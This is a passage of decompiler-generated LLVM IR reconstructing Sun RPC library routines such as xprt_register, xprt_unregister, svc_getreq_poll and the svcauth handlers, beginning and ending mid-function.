  %v3_17b7c = load i8, i8* %v2_17b7c, align 1
  %v4_17b7c = zext i8 %v3_17b7c to i32
  %v1_17b80 = add i32 %v0_17b7c, 4
  %v2_17b80 = inttoptr i32 %v1_17b80 to i8*
  %v3_17b80 = load i8, i8* %v2_17b80, align 1
  %v4_17b80 = zext i8 %v3_17b80 to i32
  %v4_17b84 = mul nuw nsw i32 %v4_17b7c, 256
  %v5_17b84 = or i32 %v4_17b80, %v4_17b84
  %v4_17b88 = call i32 @pmap_set(i32 %v0_17b6c, i32 %v0_17b70, i32 %v0_17b68, i32 %v5_17b84)
  br label %dec_label_pc_17b98

dec_label_pc_17b94:                               ; preds = %dec_label_pc_17b38, %dec_label_pc_17b48
  br label %dec_label_pc_17b98

dec_label_pc_17b98:                               ; preds = %dec_label_pc_17b68, %dec_label_pc_17b7c, %dec_label_pc_17b94
  %v0_17b98 = phi i32 [ 1, %dec_label_pc_17b68 ], [ %v4_17b88, %dec_label_pc_17b7c ], [ 0, %dec_label_pc_17b94 ]
  ret i32 %v0_17b98

; uselistorder directives
  uselistorder i32 %v1_17b48, { 2, 1, 0, 3, 4 }
  uselistorder i32 184, { 1, 5, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17b98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b94, { 1, 0 }
  uselistorder label %dec_label_pc_17b68, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_17ba4 = load i32, i32* @r4, align 4
  store i32 %v3_17ba4, i32* %stack_var_-12, align 4
  %v6_17ba4 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_17bac = load i32, i32* %arg1, align 4
  store i32 %v2_17bac, i32* @r5, align 4
  %v0_17bb0 = call i32 @_rpc_dtablesize()
  %v0_17bb4 = load i32, i32* @r5, align 4
  %v5_17bb8 = icmp slt i32 %v0_17bb4, %v0_17bb0
  br i1 %v5_17bb8, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v8_17bb8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v8_17bb8, i32* @r4, align 4
  store i32 %v6_17ba4, i32* @r5, align 4
  ret i32 %v0_17bb0

bb6:                                              ; preds = %entry
  %v0_17bbc = call i32 @__rpc_thread_variables()
  %v1_17bc0 = add i32 %v0_17bbc, 180
  %v2_17bc0 = inttoptr i32 %v1_17bc0 to i32*
  %v3_17bc0 = load i32, i32* %v2_17bc0, align 4
  %v0_17bc4 = load i32, i32* @r5, align 4
  %v3_17bc4 = mul i32 %v0_17bc4, 4
  %v2_17bc8 = add i32 %v3_17bc4, %v3_17bc0
  %v3_17bc8 = inttoptr i32 %v2_17bc8 to i32*
  %v4_17bc8 = load i32, i32* %v3_17bc8, align 4
  %v1_17bcc = load i32, i32* @r4, align 4
  %v9_17bcc = icmp eq i32 %v4_17bc8, %v1_17bcc
  br i1 %v9_17bcc, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  %v3_17bd0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_17bd0, i32* @r4, align 4
  store i32 %v6_17ba4, i32* @r5, align 4
  ret i32 %v0_17bbc

bb8:                                              ; preds = %bb6
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %v3_17bc8, align 4
  %v6_17be0 = icmp slt i32 %v0_17bc4, 1024
  br i1 %v6_17be0, label %dec_label_pc_17be4, label %dec_label_pc_17c20

dec_label_pc_17be4:                               ; preds = %bb8
  %v4_17be4 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_17bbc, i32 %v3_17bc0, i32 %v3_17bc4, i32 %v4_17bc8)
  %v0_17be8 = load i32, i32* @r5, align 4
  %v3_17be8 = udiv i32 %v0_17be8, 32
  %v4_17bec = mul nuw nsw i32 %v3_17be8, 4
  %v5_17bec = add i32 %v4_17bec, %v4_17be4
  %v6_17bec = inttoptr i32 %v5_17bec to i32*
  %v7_17bec = load i32, i32* %v6_17bec, align 4
  %v1_17bf0 = urem i32 %v0_17be8, 32
  %tmp10 = shl i32 -1, %v1_17bf0
  %v8_17bf8 = add i32 %tmp10, -1
  %v9_17bf8 = and i32 %v7_17bec, %v8_17bf8
  store i32 %v9_17bf8, i32* %v6_17bec, align 4
  br label %dec_label_pc_17c20

dec_label_pc_17c04:                               ; preds = %dec_label_pc_17c20
  %v0_17c04 = call i32 @__rpc_thread_svc_pollfd()
  %v1_17c08 = inttoptr i32 %v0_17c04 to i32*
  %v2_17c08 = load i32, i32* %v1_17c08, align 4
  %v1_17c0c = load i32, i32* @r4, align 4
  %v4_17c0c = mul i32 %v1_17c0c, 8
  %v5_17c0c = add i32 %v4_17c0c, %v2_17c08
  %v6_17c0c = inttoptr i32 %v5_17c0c to i32*
  %v7_17c0c = load i32, i32* %v6_17c0c, align 4
  %v1_17c10 = load i32, i32* @r5, align 4
  %v9_17c10 = icmp eq i32 %v7_17c0c, %v1_17c10
  br i1 %v9_17c10, label %bb9, label %.thread

bb9:                                              ; preds = %dec_label_pc_17c04
  store i32 -1, i32* %v6_17c0c, align 4
  %v0_17c1c.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17c04, %bb9
  %v0_17c1c = phi i32 [ %v1_17c0c, %dec_label_pc_17c04 ], [ %v0_17c1c.pre, %bb9 ]
  %v1_17c1c = add i32 %v0_17c1c, 1
  store i32 %v1_17c1c, i32* @r4, align 4
  br label %dec_label_pc_17c20

dec_label_pc_17c20:                               ; preds = %bb8, %dec_label_pc_17be4, %.thread
  %v0_17c20 = call i32 @__rpc_thread_svc_max_pollfd()
  %v1_17c24 = inttoptr i32 %v0_17c20 to i32*
  %v2_17c24 = load i32, i32* %v1_17c24, align 4
  %v0_17c28 = load i32, i32* @r4, align 4
  %v5_17c2c = icmp slt i32 %v0_17c28, %v2_17c24
  br i1 %v5_17c2c, label %dec_label_pc_17c04, label %dec_label_pc_17c30

dec_label_pc_17c30:                               ; preds = %dec_label_pc_17c20
  %v2_17c30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17c30, i32* @r4, align 4
  store i32 %v6_17ba4, i32* @r5, align 4
  ret i32 %v0_17c20

; uselistorder directives
  uselistorder i32 %v0_17be8, { 1, 0 }
  uselistorder i32 %v0_17bc4, { 1, 0 }
  uselistorder i32 %v3_17bc0, { 1, 0 }
  uselistorder i32 %v6_17ba4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17c20, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  br label %dec_label_pc_17c98

dec_label_pc_17c4c:                               ; preds = %bb9
  %v3_17ca8 = mul i32 %v0_17ca0, 8
  %v0_17c4c = load i32, i32* @r7, align 4
  %v2_17c4c = add i32 %v0_17c4c, %v3_17ca8
  %v3_17c4c = inttoptr i32 %v2_17c4c to i32*
  %v4_17c4c = load i32, i32* %v3_17c4c, align 4
  store i32 %v4_17c4c, i32* @r4, align 4
  %v7_17c50 = icmp eq i32 %v4_17c4c, -1
  br i1 %v7_17c50, label %dec_label_pc_17c94, label %dec_label_pc_17c5c

dec_label_pc_17c5c:                               ; preds = %dec_label_pc_17c4c
  %v1_17c5c = add i32 %v2_17c4c, 7
  %v2_17c5c = inttoptr i32 %v1_17c5c to i8*
  %v3_17c5c = load i8, i8* %v2_17c5c, align 1
  %v4_17c5c = zext i8 %v3_17c5c to i32
  %v1_17c60 = add i32 %v2_17c4c, 6
  %v2_17c60 = inttoptr i32 %v1_17c60 to i8*
  %v3_17c60 = load i8, i8* %v2_17c60, align 1
  %v4_17c60 = zext i8 %v3_17c60 to i32
  %v4_17c64 = mul nuw nsw i32 %v4_17c5c, 256
  %v5_17c64 = or i32 %v4_17c60, %v4_17c64
  %v7_17c64 = icmp eq i32 %v5_17c64, 0
  br i1 %v7_17c64, label %dec_label_pc_17c94, label %dec_label_pc_17c6c

dec_label_pc_17c6c:                               ; preds = %dec_label_pc_17c5c
  %v1_17c6c = and i32 %v4_17c60, 32
  %v2_17c6c = icmp eq i32 %v1_17c6c, 0
  %v0_17c74 = load i32, i32* @r6, align 4
  %v1_17c74 = add i32 %v0_17c74, 1
  store i32 %v1_17c74, i32* @r6, align 4
  br i1 %v2_17c6c, label %dec_label_pc_17c90, label %dec_label_pc_17c7c

dec_label_pc_17c7c:                               ; preds = %dec_label_pc_17c6c
  %v0_17c7c = call i32 @__rpc_thread_variables()
  %v1_17c80 = add i32 %v0_17c7c, 180
  %v2_17c80 = inttoptr i32 %v1_17c80 to i32*
  %v3_17c80 = load i32, i32* %v2_17c80, align 4
  %v1_17c84 = load i32, i32* @r4, align 4
  %v4_17c84 = mul i32 %v1_17c84, 4
  %v5_17c84 = add i32 %v4_17c84, %v3_17c80
  %v6_17c84 = inttoptr i32 %v5_17c84 to i32*
  %v7_17c84 = load i32, i32* %v6_17c84, align 4
  %v1_17c88 = inttoptr i32 %v7_17c84 to i32*
  %v2_17c88 = call i32 @xprt_unregister(i32* %v1_17c88)
  br label %dec_label_pc_17c94

dec_label_pc_17c90:                               ; preds = %dec_label_pc_17c6c
  %v1_17c90 = call i32 @svc_getreq_common(i32 %v4_17c4c)
  br label %dec_label_pc_17c94

dec_label_pc_17c94:                               ; preds = %dec_label_pc_17c5c, %dec_label_pc_17c4c, %dec_label_pc_17c7c, %dec_label_pc_17c90
  %v0_17c94 = load i32, i32* @r5, align 4
  %v1_17c94 = add i32 %v0_17c94, 1
  br label %dec_label_pc_17c98

dec_label_pc_17c98:                               ; preds = %entry, %dec_label_pc_17c94
  %storemerge = phi i32 [ 0, %entry ], [ %v1_17c94, %dec_label_pc_17c94 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_17c98 = call i32 @__rpc_thread_svc_max_pollfd()
  %v1_17c9c = inttoptr i32 %v0_17c98 to i32*
  %v2_17c9c = load i32, i32* %v1_17c9c, align 4
  %v0_17ca0 = load i32, i32* @r5, align 4
  %v2_17ca0 = sub i32 %v0_17ca0, %v2_17c9c
  %v4_17ca0 = xor i32 %v0_17ca0, %v2_17c9c
  %v5_17ca0 = xor i32 %v2_17ca0, %v0_17ca0
  %v6_17ca0 = and i32 %v5_17ca0, %v4_17ca0
  %v5_17ca4 = icmp slt i32 %v0_17ca0, %v2_17c9c
  br i1 %v5_17ca4, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_17c98
  %v6_17ca4 = load i32, i32* @r6, align 4
  %v7_17ca4 = load i32, i32* @r8, align 4
  %v8_17ca4 = sub i32 %v6_17ca4, %v7_17ca4
  %v10_17ca4 = xor i32 %v7_17ca4, %v6_17ca4
  %v11_17ca4 = xor i32 %v8_17ca4, %v6_17ca4
  %v12_17ca4 = and i32 %v11_17ca4, %v10_17ca4
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_17c98, %bb
  %v1_17cac.in = phi i32 [ %v6_17ca0, %dec_label_pc_17c98 ], [ %v12_17ca4, %bb ]
  %v0_17cac.in = phi i32 [ %v2_17ca0, %dec_label_pc_17c98 ], [ %v8_17ca4, %bb ]
  %v0_17cac = icmp slt i32 %v0_17cac.in, 0
  %v1_17cac = icmp slt i32 %v1_17cac.in, 0
  %v2_17cac = xor i1 %v1_17cac, %v0_17cac
  br i1 %v2_17cac, label %dec_label_pc_17c4c, label %dec_label_pc_17cb0

dec_label_pc_17cb0:                               ; preds = %bb9
  ret i32 %v0_17c98

; uselistorder directives
  uselistorder i32 %v0_17ca0, { 3, 1, 2, 4, 0 }
  uselistorder i32 %v2_17c9c, { 1, 0, 2 }
  uselistorder i32 %v4_17c60, { 1, 0 }
  uselistorder i32 %v4_17c4c, { 1, 0, 2 }
  uselistorder i32 (i32)* @svc_getreq_common, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %dec_label_pc_17c98, { 1, 0 }
  uselistorder label %dec_label_pc_17c94, { 3, 2, 0, 1 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r5, align 4
  %v0_17cbc = call i32 @__rpc_thread_variables()
  %v1_17cc0 = add i32 %v0_17cbc, 180
  %v2_17cc0 = inttoptr i32 %v1_17cc0 to i32*
  %v3_17cc0 = load i32, i32* %v2_17cc0, align 4
  store i32 %v3_17cc0, i32* %r3.global-to-local, align 4
  %v2_17cc4 = icmp eq i32 %v3_17cc0, 0
  store i32 %v0_17cbc, i32* @r4, align 4
  %v0_17ccc = load i32, i32* @r5, align 4
  %v1_17ccc = inttoptr i32 %v0_17ccc to i32*
  %v2_17ccc = load i32, i32* %v1_17ccc, align 4
  store i32 %v2_17ccc, i32* @r7, align 4
  br i1 %v2_17cc4, label %dec_label_pc_17cd4, label %bb9

dec_label_pc_17cd4:                               ; preds = %entry
  %v0_17cd4 = call i32 @_rpc_dtablesize()
  %v3_17cd8 = mul i32 %v0_17cd4, 4
  %v1_17cdc = call i32 @malloc(i32 %v3_17cd8)
  %v2_17ce0 = icmp eq i32 %v1_17cdc, 0
  %v1_17ce4 = load i32, i32* @r4, align 4
  %v2_17ce4 = add i32 %v1_17ce4, 180
  %v3_17ce4 = inttoptr i32 %v2_17ce4 to i32*
  store i32 %v1_17cdc, i32* %v3_17ce4, align 4
  br i1 %v2_17ce0, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_17cd4
  ret i32 0

bb9:                                              ; preds = %entry, %dec_label_pc_17cd4
  %v0_17cec = call i32 @_rpc_dtablesize()
  %v0_17cf0 = load i32, i32* @r7, align 4
  %v5_17cf4 = icmp slt i32 %v0_17cf0, %v0_17cec
  br i1 %v5_17cf4, label %bb11, label %bb10

bb10:                                             ; preds = %bb9
  ret i32 %v0_17cec

bb11:                                             ; preds = %bb9
  %v0_17cf8 = load i32, i32* @r4, align 4
  %v1_17cf8 = add i32 %v0_17cf8, 180
  %v2_17cf8 = inttoptr i32 %v1_17cf8 to i32*
  %v3_17cf8 = load i32, i32* %v2_17cf8, align 4
  store i32 %v3_17cf8, i32* %r3.global-to-local, align 4
  %v0_17d00 = load i32, i32* @r5, align 4
  %v5_17d00 = mul i32 %v0_17cf0, 4
  %v6_17d00 = add i32 %v3_17cf8, %v5_17d00
  %v7_17d00 = inttoptr i32 %v6_17d00 to i32*
  store i32 %v0_17d00, i32* %v7_17d00, align 4
  %v6_17d04 = icmp slt i32 %v0_17cf0, 1024
  br i1 %v6_17d04, label %dec_label_pc_17d08, label %dec_label_pc_17d6c

dec_label_pc_17d08:                               ; preds = %bb11
  %v1_17d08 = load i32, i32* @r1, align 4
  %v2_17d08 = load i32, i32* @r2, align 4
  %v4_17d08 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_17cec, i32 %v1_17d08, i32 %v2_17d08, i32 %v3_17cf8)
  %v0_17d0c = load i32, i32* @r7, align 4
  %v3_17d0c = udiv i32 %v0_17d0c, 32
  %v4_17d10 = mul nuw nsw i32 %v3_17d0c, 4
  %v5_17d10 = add i32 %v4_17d10, %v4_17d08
  %v6_17d10 = inttoptr i32 %v5_17d10 to i32*
  %v7_17d10 = load i32, i32* %v6_17d10, align 4
  %v1_17d14 = urem i32 %v0_17d0c, 32
  store i32 %v1_17d14, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_17d1c = shl i32 1, %v1_17d14
  %v8_17d1c = or i32 %v7_17d1c, %v7_17d10
  store i32 %v8_17d1c, i32* %r3.global-to-local, align 4
  store i32 %v8_17d1c, i32* %v6_17d10, align 4
  br label %dec_label_pc_17d6c

dec_label_pc_17d2c:                               ; preds = %dec_label_pc_17d6c
  %v0_17d2c = call i32 @__rpc_thread_svc_pollfd()
  %v1_17d30 = inttoptr i32 %v0_17d2c to i32*
  %v2_17d30 = load i32, i32* %v1_17d30, align 4
  store i32 %v2_17d30, i32* %r2.global-to-local, align 4
  %v1_17d34 = load i32, i32* @r5, align 4
  %v4_17d34 = mul i32 %v1_17d34, 8
  %v5_17d34 = add i32 %v4_17d34, %v2_17d30
  %v6_17d34 = inttoptr i32 %v5_17d34 to i32*
  %v7_17d34 = load i32, i32* %v6_17d34, align 4
  store i32 %v7_17d34, i32* %r3.global-to-local, align 4
  %v3_17d38 = icmp eq i32 %v7_17d34, -1
  store i32 %v0_17d2c, i32* %r1.global-to-local, align 4
  %v3_17d40 = mul i32 %v1_17d34, 8
  %v1_17d68 = add i32 %v1_17d34, 1
  br i1 %v3_17d38, label %dec_label_pc_17d48, label %dec_label_pc_17d6c

dec_label_pc_17d48:                               ; preds = %dec_label_pc_17d2c
  %v0_17d48 = load i32, i32* @r7, align 4
  store i32 %v0_17d48, i32* %v6_17d34, align 4
  %v0_17d4c = load i32, i32* %r1.global-to-local, align 4
  %v1_17d4c = inttoptr i32 %v0_17d4c to i32*
  %v2_17d4c = load i32, i32* %v1_17d4c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_17d54 = add i32 %v2_17d4c, %v3_17d40
  store i32 %v2_17d54, i32* %r3.global-to-local, align 4
  %v3_17d58 = add i32 %v2_17d54, 5
  %v4_17d58 = inttoptr i32 %v3_17d58 to i8*
  store i8 0, i8* %v4_17d58, align 1
  %v0_17d5c = load i32, i32* %r2.global-to-local, align 4
  %v1_17d5c = add i32 %v0_17d5c, 195
  store i32 %v1_17d5c, i32* %r2.global-to-local, align 4
  %v1_17d60 = trunc i32 %v1_17d5c to i8
  %v2_17d60 = load i32, i32* %r3.global-to-local, align 4
  %v3_17d60 = add i32 %v2_17d60, 4
  %v4_17d60 = inttoptr i32 %v3_17d60 to i8*
  store i8 %v1_17d60, i8* %v4_17d60, align 1
  ret i32 %v3_17d40

dec_label_pc_17d6c:                               ; preds = %dec_label_pc_17d08, %bb11, %dec_label_pc_17d2c
  %storemerge = phi i32 [ %v1_17d68, %dec_label_pc_17d2c ], [ 0, %bb11 ], [ 0, %dec_label_pc_17d08 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_17d6c = call i32 @__rpc_thread_svc_max_pollfd()
  %v1_17d70 = inttoptr i32 %v0_17d6c to i32*
  %v2_17d70 = load i32, i32* %v1_17d70, align 4
  store i32 %v2_17d70, i32* @r4, align 4
  %v0_17d74 = load i32, i32* @r5, align 4
  store i32 %v0_17d6c, i32* @r6, align 4
  %v5_17d7c = icmp slt i32 %v0_17d74, %v2_17d70
  br i1 %v5_17d7c, label %dec_label_pc_17d2c, label %dec_label_pc_17d80

dec_label_pc_17d80:                               ; preds = %dec_label_pc_17d6c
  %v1_17d80 = add i32 %v2_17d70, 1
  store i32 %v1_17d80, i32* @r4, align 4
  store i32 %v1_17d80, i32* %v1_17d70, align 4
  %v0_17d88 = call i32 @__rpc_thread_svc_pollfd()
  %v0_17d8c = load i32, i32* @r4, align 4
  %v3_17d8c = mul i32 %v0_17d8c, 8
  store i32 %v3_17d8c, i32* %r1.global-to-local, align 4
  store i32 %v0_17d88, i32* @r5, align 4
  %v1_17d94 = inttoptr i32 %v0_17d88 to i32*
  %v2_17d94 = load i32, i32* %v1_17d94, align 4
  %v2_17d98 = call i32 @realloc(i32 %v2_17d94, i32 %v3_17d8c)
  %v2_17d9c = icmp eq i32 %v2_17d98, 0
  %v1_17da0 = load i32, i32* @r5, align 4
  %v2_17da0 = inttoptr i32 %v1_17da0 to i32*
  store i32 %v2_17d98, i32* %v2_17da0, align 4
  br i1 %v2_17d9c, label %bb12, label %bb13

bb12:                                             ; preds = %dec_label_pc_17d80
  ret i32 0

bb13:                                             ; preds = %dec_label_pc_17d80
  %v0_17da8 = load i32, i32* @r6, align 4
  %v1_17da8 = inttoptr i32 %v0_17da8 to i32*
  %v2_17da8 = load i32, i32* %v1_17da8, align 4
  %v4_17dac = mul i32 %v2_17da8, 8
  %v5_17dac = add i32 %v4_17dac, %v2_17d98
  store i32 %v5_17dac, i32* %r3.global-to-local, align 4
  %v0_17db0 = load i32, i32* @r7, align 4
  %v2_17db0 = add i32 %v5_17dac, -8
  %v3_17db0 = inttoptr i32 %v2_17db0 to i32*
  store i32 %v0_17db0, i32* %v3_17db0, align 4
  %v0_17db4 = load i32, i32* @r6, align 4
  %v1_17db4 = inttoptr i32 %v0_17db4 to i32*
  %v2_17db4 = load i32, i32* %v1_17db4, align 4
  store i32 %v2_17db4, i32* %r2.global-to-local, align 4
  %v0_17db8 = load i32, i32* @r5, align 4
  %v1_17db8 = inttoptr i32 %v0_17db8 to i32*
  %v2_17db8 = load i32, i32* %v1_17db8, align 4
  %v4_17dbc = mul i32 %v2_17db4, 8
  %v5_17dbc = add i32 %v2_17db8, %v4_17dbc
  store i32 %v5_17dbc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_17dc4 = add i32 %v5_17dbc, -3
  %v4_17dc4 = inttoptr i32 %v3_17dc4 to i8*
  store i8 0, i8* %v4_17dc4, align 1
  %v0_17dc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_17dc8 = add i32 %v0_17dc8, 195
  store i32 %v1_17dc8, i32* %r2.global-to-local, align 4
  %v1_17dcc = trunc i32 %v1_17dc8 to i8
  %v2_17dcc = load i32, i32* %r3.global-to-local, align 4
  %v3_17dcc = add i32 %v2_17dcc, -4
  %v4_17dcc = inttoptr i32 %v3_17dcc to i8*
  store i8 %v1_17dcc, i8* %v4_17dcc, align 1
  ret i32 %v2_17d98

; uselistorder directives
  uselistorder i32 %v2_17d98, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17d8c, { 1, 0 }
  uselistorder i32 %v0_17d88, { 1, 0 }
  uselistorder i32 %v1_17d34, { 1, 0, 2 }
  uselistorder i32 %v1_17d14, { 1, 0 }
  uselistorder i32 %v0_17d0c, { 1, 0 }
  uselistorder i32 %v3_17cf8, { 1, 0, 2 }
  uselistorder i32 %v0_17cf0, { 1, 0, 2 }
  uselistorder i32 %v0_17cec, { 1, 0, 2 }
  uselistorder i32 -8, { 29, 12, 13, 14, 15, 16, 17, 11, 10, 4, 9, 8, 7, 6, 18, 19, 20, 21, 5, 22, 23, 2, 0, 27, 24, 25, 26, 1, 30, 31, 3, 28 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 2, 1, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 ()* @_rpc_dtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_17d6c, { 2, 0, 1 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @_authenticate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17dd4 = load i32, i32* @r4, align 4
  store i32 %v3_17dd4, i32* %stack_var_-8, align 4
  %v1_17dd8 = add i32 %arg2, 24
  store i32 %arg1, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v1_17de4 = inttoptr i32 %v1_17dd8 to i32*
  %v2_17de4 = load i32, i32* %v1_17de4, align 4
  store i32 %v2_17de4, i32* %r0.global-to-local, align 4
  %v3_17de4 = add i32 %arg2, 28
  %v4_17de4 = inttoptr i32 %v3_17de4 to i32*
  %v5_17de4 = load i32, i32* %v4_17de4, align 4
  store i32 %v5_17de4, i32* %r1.global-to-local, align 4
  %v6_17de4 = add i32 %arg2, 32
  %v7_17de4 = inttoptr i32 %v6_17de4 to i32*
  %v8_17de4 = load i32, i32* %v7_17de4, align 4
  store i32 %v8_17de4, i32* %r2.global-to-local, align 4
  %v1_17de8 = add i32 %arg1, 12
  %v1_17dec = inttoptr i32 %v1_17de8 to i32*
  store i32 %v2_17de4, i32* %v1_17dec, align 4
  %v3_17dec = add i32 %arg1, 16
  %v4_17dec = inttoptr i32 %v3_17dec to i32*
  %v5_17dec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17dec, i32* %v4_17dec, align 4
  %v6_17dec = add i32 %arg1, 20
  %v7_17dec = inttoptr i32 %v6_17dec to i32*
  %v8_17dec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17dec, i32* %v7_17dec, align 4
  %v2_17df4 = load i32, i32* @global_var_2f610.862, align 4
  store i32 %v2_17df4, i32* %r2.global-to-local, align 4
  %v0_17df8 = load i32, i32* %ip.global-to-local, align 4
  %v1_17df8 = add i32 %v0_17df8, 28
  %v2_17df8 = inttoptr i32 %v1_17df8 to i32*
  %v3_17df8 = load i32, i32* %v2_17df8, align 4
  %v2_17dfc = add i32 %v3_17df8, 32
  %v3_17dfc = inttoptr i32 %v2_17dfc to i32*
  store i32 %v2_17df4, i32* %v3_17dfc, align 4
  %v0_17e00 = load i32, i32* %ip.global-to-local, align 4
  %v1_17e00 = add i32 %v0_17e00, 12
  %v2_17e00 = inttoptr i32 %v1_17e00 to i32*
  %v3_17e00 = load i32, i32* %v2_17e00, align 4
  store i32 %v3_17e00, i32* %r4.global-to-local, align 4
  %v1_17e04 = add i32 %v0_17e00, 28
  %v2_17e04 = inttoptr i32 %v1_17e04 to i32*
  %v3_17e04 = load i32, i32* %v2_17e04, align 4
  store i32 %v3_17e04, i32* %r2.global-to-local, align 4
  store i32 %v0_17e00, i32* %r0.global-to-local, align 4
  %v0_17e14 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_17e14, i32* %r1.global-to-local, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  %v2_17e1c = add i32 %v3_17e04, 40
  %v3_17e1c = inttoptr i32 %v2_17e1c to i32*
  store i32 0, i32* %v3_17e1c, align 4
  store i32 97840, i32* %lr.global-to-local, align 4
  %v1_17e2c = load i32, i32* %r4.global-to-local, align 4
  %v4_17e2c = mul i32 %v1_17e2c, 4
  %v5_17e2c = add i32 %v4_17e2c, ptrtoint (i32* @global_var_1dd14.896 to i32)
  %v6_17e2c = inttoptr i32 %v5_17e2c to i32*
  %v7_17e2c = load i32, i32* %v6_17e2c, align 4
  call void @__pseudo_branch(i32 %v7_17e2c)
  %v0_17e30 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17e30, i32* %ip.global-to-local, align 4
  %v2_17e38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17e38, i32* @r4, align 4
  ret i32 %v0_17e30

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder i32 %arg1, { 2, 1, 0, 3, 4 }
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17e54 = load i32, i32* @r4, align 4
  store i32 %v3_17e54, i32* %stack_var_-28, align 4
  %v6_17e54 = load i32, i32* @r5, align 4
  %v9_17e54 = load i32, i32* @r6, align 4
  %v12_17e54 = load i32, i32* @r7, align 4
  %v15_17e54 = load i32, i32* @r8, align 4
  %v1_17e58 = add i32 %arg1, 24
  %v2_17e58 = inttoptr i32 %v1_17e58 to i32*
  %v3_17e58 = load i32, i32* %v2_17e58, align 4
  store i32 %v3_17e58, i32* @r6, align 4
  %v1_17e5c = add i32 %v3_17e58, 24
  %v1_17e60 = add i32 %v3_17e58, 280
  store i32 %v1_17e60, i32* %r2.global-to-local, align 4
  %v2_17e64 = add i32 %v3_17e58, 4
  %v3_17e64 = inttoptr i32 %v2_17e64 to i32*
  store i32 %v1_17e5c, i32* %v3_17e64, align 4
  %v0_17e68 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e68 = load i32, i32* @r6, align 4
  %v2_17e68 = add i32 %v1_17e68, 20
  %v3_17e68 = inttoptr i32 %v2_17e68 to i32*
  store i32 %v0_17e68, i32* %v3_17e68, align 4
  %v1_17e6c = add i32 %arg2, 32
  %v2_17e6c = inttoptr i32 %v1_17e6c to i32*
  %v3_17e6c = load i32, i32* %v2_17e6c, align 4
  store i32 %v3_17e6c, i32* @r8, align 4
  %v2_17e70 = ptrtoint i32* %stack_var_-52 to i32
